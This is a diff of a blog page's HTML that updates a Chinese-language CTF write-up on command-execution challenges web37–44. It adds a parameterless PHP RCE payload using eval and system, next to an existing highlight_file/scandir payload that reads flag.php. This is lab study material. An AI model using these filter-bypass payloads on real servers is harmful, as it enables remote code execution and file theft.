@@ -23,6 +23,8 @@
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250312152233344.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250312152433613.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250312152635159.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250417134338701.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250417134418599.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250312155428575.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250312155807792.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250312155617002.png">
@@ -32,7 +34,7 @@
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250312160812316.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/12/web37-44/file-20250312160850228.png">
 <meta property="article:published_time" content="2025-03-12T06:31:19.000Z">
-<meta property="article:modified_time" content="2025-03-12T08:08:54.493Z">
+<meta property="article:modified_time" content="2025-04-17T05:44:28.603Z">
 <meta property="article:author" content="Y0ungK1ng">
 <meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary">
@@ -222,7 +224,7 @@
 <h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><p>开启容器，题目提示</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令执行，需要严格的过滤</span><br></pre></td></tr></table></figure>
 
-<p>发现“.”都被被过滤<br>只能利用无参数命令执行</p>
+<p>发现“.”都被被过滤<br>但是括号很细节，是中文的，所以可以用英文括号<br>只能利用无参数命令执行</p>
 <p>函数：<code>print_r(scandir(&#39;.&#39;))</code>可以用来查看当前目录所有文件名<br>接下来需要将括号中的<code>.</code>替代掉</p>
 <p><img src="/2025/03/12/web37-44/file-20250312152233344.png"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">reset</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"><span class="comment">//以上函数均可查看当前目录文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -232,6 +234,10 @@
 <p>flag.php位于数组的第三个值里，也就是倒数第二个，我们可以通过<code>array_reverse()</code>函数以相反的元素顺序返回数组，在用<code>next()</code>函数读取下一个元素，最后通过<code>highlight_file()</code>函数读取到flag.php</p>
 <p><code>payload：c=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></p>
 <p><img src="/2025/03/12/web37-44/file-20250312152635159.png"></p>
+<p>同时可以用无参数RCE</p>
+<p><code>?c=eval(end(current(get_defined_vars())));&amp;b=system(&#39;ls&#39;);</code></p>
+<p><img src="/2025/03/12/web37-44/file-20250417134338701.png"></p>
+<p><img src="/2025/03/12/web37-44/file-20250417134418599.png"></p>
 <h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><p>开启容器，题目提示</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**过滤不严，命令执行**</span><br></pre></td></tr></table></figure>
 
